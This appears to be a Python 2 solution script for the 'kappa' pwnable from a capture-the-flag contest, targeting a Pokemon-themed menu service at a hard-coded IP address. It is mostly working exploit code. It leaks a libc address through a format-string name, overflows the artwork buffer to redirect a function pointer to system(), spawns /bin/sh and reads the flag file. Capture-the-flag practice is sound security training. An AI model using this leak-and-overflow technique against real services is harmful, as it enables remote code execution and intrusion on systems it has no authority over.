__author__ = 'HuyNA'
"""
kappa
Pwnables (275 pts)
There's got to be a way to get into this service set up by the Plague at 54.80.112.128:1313. Can you find it?
socat TCP-LISTEN:1313,reuseaddr,fork EXEC:./kappa
"""

import os
import socket
import time
import struct
import sys
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "54.80.112.128"
local_host="192.168.248.172"
port = 1313
s.connect((host, port))
#s.connect((local_host, port))

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

"""
      szChooseanOption1_GointotheGrass2_HealyourPokemon3_I db 'Choose an Option:',0Ah
.rodata:08049514 3A 0A 31 2E 20 47 6F 20+            db '1. Go into the Grass',0Ah
.rodata:08049514 69 6E 74 6F 20 74 68 65+            db '2. Heal your Pokemon',0Ah
.rodata:08049514 20 47 72 61 73 73 0A 32+            db '3. Inpect your Pokemon',0Ah
.rodata:08049514 2E 20 48 65 61 6C 20 79+            db '4. Release a Pokemon',0Ah
.rodata:08049514 6F 75 72 20 50 6F 6B 65+            db '5. Change Pokemon artwork',0Ah,0


"""

#sys.stdin.read(1)

battle_count = 0        # battle_count = chan => gap kukana
                       # battle_count = 13 => charizard
count_pokemon = 1
id_list = "2\n"
ft = "%23$x%24$x"

def grass():
    global battle_count, count_pokemon, id_list, ft
    battle_count += 1
    print "[+] # goto to grass ... " + str(battle_count)
    print recv_until(s, "Change Pokemon artwork\n");
    data = "1\n"
    s.send(data)
    if battle_count % 13:
        if battle_count % 2:
            print recv_until(s, "You failed to find any Pokemon!\n")
        else:
            # encounter kukana
            print recv_until(s, "3. Run\n")
            if count_pokemon <= 4:         # = 1 => thu phuc
                s.send("2\n")
                print recv_until(s,"What would you like to name this Pokemon?\n")
                s.send("kun_"+str(count_pokemon)+"\n")
                count_pokemon+=1
            else:
                s.send("1\n")
    else:
        # encounter charizard => thu phuc => gan vao id = 2
        print recv_until(s, "3. Run\n")
        for i in xrange(4):
            s.send("1\n")
            print recv_until(s, "3. Run\n")

        s.send("2\n")
        print recv_until(s,"What would you like to name this Pokemon?\n")
        s.send(ft+"\n")
        count_pokemon+=1
        print recv_until(s,"kun_4\n")
        s.send(id_list)


for i in xrange(13):
    grass()
    time.sleep(0.001)

print "[+] # change art => send rop"
print recv_until(s, "Change Pokemon artwork\n");
s.send("5\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
#print recv_until(s,"\n")

printf_func = struct.pack("<I",0x08048520)
puts_func = struct.pack("<I",0x08048590)

s.send("2\n")   # send id of pokemon to change art
data="B"*513+printf_func+"\x05"*4+"\x01"*4+"\x02"*4+"\x03"*4
shellcode = data+"A"*(2151-len(data))+"\n"
time.sleep(0.001)
s.send(shellcode)

print recv_until(s, "I'm sure you'll love to show this new art to your friends!\n")

print "[+]# inspect pokemon => trigger"
time.sleep(0.001)

print recv_until(s, "Change Pokemon artwork\n");
s.send("3\n")

print "[+] DONE ...."

recv_until(s,"Attack: Gust\n")
data = recv_until(s, "\n")
print data
print data.encode("hex")
base_address = int(data[0:8], 16) - 0x00016E16
print hex(base_address)

print "[+]============================================================================================================="
print "[+]# set up 1 cau lenh khac ..."
id_list = "3\n"
ft = "cd home;"
for i in xrange(13):
    grass()
    time.sleep(0.001)

print "[+] # change art => send rop"
print recv_until(s, "Change Pokemon artwork\n");
s.send("5\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")

system_func = base_address+0x0003B990
system_func_address = struct.pack("<I",system_func)
printf_func_2 = base_address+0x000498F0
printf_func_2_address = struct.pack("<I",printf_func_2)
print hex(base_address)
print hex(system_func)
s.send("3\n")   # send id of pokemon to change art
data="B"*513+system_func_address+"\x05"*4+"\x01"*4+"\x02"*4+"\x03"*4
shellcode = data+"A"*(2151-len(data))+"\n"
s.send(shellcode)

print recv_until(s, "I'm sure you'll love to show this new art to your friends!\n")

print "[+]# inspect pokemon => trigger"
print recv_until(s, "Change Pokemon artwork\n");
s.send("3\n")

print "[+] DONE 2...."


print "[+]============================================================================================================="
print "[+]# set up 1 cau lenh khac ..."
id_list = "4\n"
ft = "/bin/sh"
for i in xrange(13):
    grass()
    time.sleep(0.001)

print "[+] # change art => send rop"
print recv_until(s, "Change Pokemon artwork\n");
s.send("5\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")
print recv_until(s,"\n")

print hex(base_address)
print hex(system_func)
s.send("4\n")   # send id of pokemon to change art
data="B"*513+system_func_address+"\x05"*4+"\x01"*4+"\x02"*4+"\x03"*4
shellcode = data+"A"*(2151-len(data))+"\n"
s.send(shellcode)

print recv_until(s, "I'm sure you'll love to show this new art to your friends!\n")

print "[+]# inspect pokemon => trigger"
print recv_until(s, "Change Pokemon artwork\n");
s.send("3\n")

print "[+] DONE 2...."

s.send('cat /home/kappa/flag\n')

print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)
print s.recv(10240)



"""

Start_Start_Start_Start_Kapppa

recv_until(s,"Attack: Gust\n")
data = recv_until(s, "\n")
print data
print recv_until(s, "Change Pokemon artwork\n");
"""


# b *0x08049078

"""
opcode: 890424e8428401310a
00016E16
b7649e16
1


b7767590
0804935b

b772aff4

b7773ff4    7cbd14 f87beebf23930408010a
bff2cd28
08048e8e

2
b7702ff4
bf9aef38
08048e8e
850
a00de681
"""